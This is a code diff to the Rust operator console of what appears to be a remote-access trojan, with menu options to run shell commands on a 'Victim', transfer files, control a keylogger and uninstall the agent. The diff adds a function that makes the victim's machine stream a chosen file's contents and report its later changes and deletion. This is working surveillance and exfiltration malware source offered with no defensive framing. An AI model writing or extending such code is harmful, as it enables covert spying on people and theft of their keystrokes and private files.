@@ -28,7 +28,7 @@ use port_knkr::{KnockSession, port_knock};
 use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
              PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
-             PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
+             PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
              CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
 
@@ -121,8 +121,9 @@ impl Commander {
         println!("4) Run Shell Command");
         println!("5) Transfer File to Victim");
         println!("6) Transfer File from Victim");
-        println!("7) Uninstall Agent");
-        println!("8) Disconnect");
+        println!("7) Watch a File for changes");
+        println!("8) Uninstall Agent");
+        println!("9) Disconnect");
         println!("0) Exit Commander");
         
         match prompt("Selection > ").as_str() {
@@ -132,8 +133,9 @@ impl Commander {
             "4" => self.run_program(),
             "5" => self.upload_file(),
             "6" => self.download_file(),
-            "7" => self.uninstall(),
-            "8" => self.disconnect(),
+            "7" => self.file_watcher(),
+            "8" => self.uninstall(),
+            "9" => self.disconnect(),
             "0" => {
                 self.running.store(false, Ordering::SeqCst);
             },
@@ -331,7 +333,6 @@ impl Commander {
                     if !data.is_empty() {
                         println!("\nReceived {} bytes of keylog data", data.len());
                         if let Ok(mut f) = std::fs::File::create("keylog.txt") {
-                            use std::io::Write;
                             let _ = f.write_all(data);
                             println!("Saved to keylog.txt");
                         }
@@ -475,6 +476,149 @@ impl Commander {
         } else {
             println!("\n[!] No data received");
         }
+    }
+
+    fn file_watcher(&mut self) {
+        let remote_path = prompt("Remote file path to watch: ");
+        
+        if remote_path.is_empty() {
+            println!("[!] Invalid path");
+            return;
+        }
+        
+        // Create watched directories
+        std::fs::create_dir_all("watched").ok();
+        std::fs::create_dir_all("watched/deleted").ok();
+        
+        let local_filename = remote_path.split('/').last().unwrap_or("watched_file");
+        let local_path = format!("watched/{}", local_filename);
+        
+        println!("[*] Starting file watch on {}...", remote_path);
+        println!("[*] Local save location: {}", local_path);
+        
+        // Send command to victim to start watching (0x71 = file watch marker)
+        let mut request = Vec::new();
+        request.push(0x71);
+        request.push(remote_path.as_bytes().len() as u8);
+        request.extend_from_slice(remote_path.as_bytes());
+        
+        if self.send_packet(PACKET_TYPE_CMD, 0, &request).is_err() {
+            println!("[!] Failed to send watch request");
+            return;
+        }
+        
+        println!("[+] Watch request sent. Receiving initial file content...");
+        
+        // Receive initial file content (reuse same mechanism as download_file)
+        let mut file_data = Vec::new();
+        let start = Instant::now();
+        let mut chunk_count = 0;
+        
+        while start.elapsed() < Duration::from_secs(30) && self.running.load(Ordering::SeqCst) {
+            self.process_incoming();
+            
+            if let Some(ip) = self.victim_ip {
+                if let Some(data) = self.keylog_buffer.get(&ip) {
+                    if data.len() == 1 && data[0] == 0xFF {
+                        break; // End of file marker
+                    }
+                    file_data.extend_from_slice(data);
+                    chunk_count += 1;
+                    self.keylog_buffer.remove(&ip);
+                }
+            }
+            thread::sleep(Duration::from_millis(100));
+        }
+        
+        // Save initial file
+        if !file_data.is_empty() {
+            match std::fs::write(&local_path, &file_data) {
+                Ok(_) => println!("[+] Initial file saved ({} chunks)", chunk_count),
+                Err(e) => println!("[!] Failed to save initial file: {}", e),
+            }
+        } else {
+            println!("[!] No initial file content received");
+        }
+        
+        // Monitor for changes
+        println!("[*] Monitoring for file changes (Ctrl+C to stop)...");
+        let watch_start = Instant::now();
+        let mut last_update = Instant::now();
+        
+        while watch_start.elapsed() < Duration::from_secs(600) && self.running.load(Ordering::SeqCst) {
+            self.process_incoming();
+            
+            if let Some(ip) = self.victim_ip {
+                if let Some(data) = self.keylog_buffer.get(&ip) {
+                    // Check for delete marker (0x72 = file deleted)
+                    if data.len() >= 1 && data[0] == 0x72 {
+                        // Move to deleted folder with timestamp
+                        let timestamp = Instant::now().duration_since(watch_start).as_secs();
+                        let deleted_path = format!("watched/deleted/{}_{}", local_filename, timestamp);
+                        
+                        if std::path::Path::new(&local_path).exists() {
+                            match std::fs::rename(&local_path, &deleted_path) {
+                                Ok(_) => println!("[!] File deleted on victim, moved to {}", deleted_path),
+                                Err(e) => {
+                                    println!("[!] Failed to move deleted file: {}", e);
+                                    std::fs::write(&deleted_path, &[]).ok();
+                                }
+                            }
+                        } else {
+                            std::fs::write(&deleted_path, &[]).ok();
+                            println!("[!] File deleted on victim (no local copy)");
+                        }
+                        
+                        self.keylog_buffer.remove(&ip);
+                        break;
+                    }
+                    
+                    // Check for update marker (0x73 = file updated)
+                    if data.len() >= 1 && data[0] == 0x73 {
+                        // Rest of data is new file content
+                        let content = &data[1..];
+                        if !content.is_empty() || data.len() == 1 {
+                            match std::fs::write(&local_path, content) {
+                                Ok(_) => {
+                                    let elapsed = Instant::now().duration_since(last_update);
+                                    println!("[*] File updated at {}s ({} bytes)", 
+                                        elapsed.as_secs(), content.len());
+                                    last_update = Instant::now();
+                                }
+                                Err(e) => println!("[!] Failed to save update: {}", e),
+                            }
+                        }
+                        self.keylog_buffer.remove(&ip);
+                        continue;
+                    }
+                    
+                    // Regular file chunk (continuation of update)
+                    if data.len() == 1 && data[0] == 0xFF {
+                        // End of update marker
+                        println!("[+] File update complete");
+                        self.keylog_buffer.remove(&ip);
+                        continue;
+                    }
+                    
+                    // Regular data chunk
+                    if !data.is_empty() && data[0] != 0xFF {
+                        file_data.extend_from_slice(data);
+                        self.keylog_buffer.remove(&ip);
+                    }
+                }
+            }
+            thread::sleep(Duration::from_millis(500));
+        }
+        
+        // Send stop watching command
+        println!("[*] Stopping file watch...");
+        let mut stop_request = Vec::new();
+        stop_request.push(0x74); // Stop watch marker
+        stop_request.push(remote_path.as_bytes().len() as u8);
+        stop_request.extend_from_slice(remote_path.as_bytes());
+        let _ = self.send_packet(PACKET_TYPE_CMD, 0, &stop_request);
+        
+        println!("[+] File watch session ended");
     }
 
     fn uninstall(&mut self) {
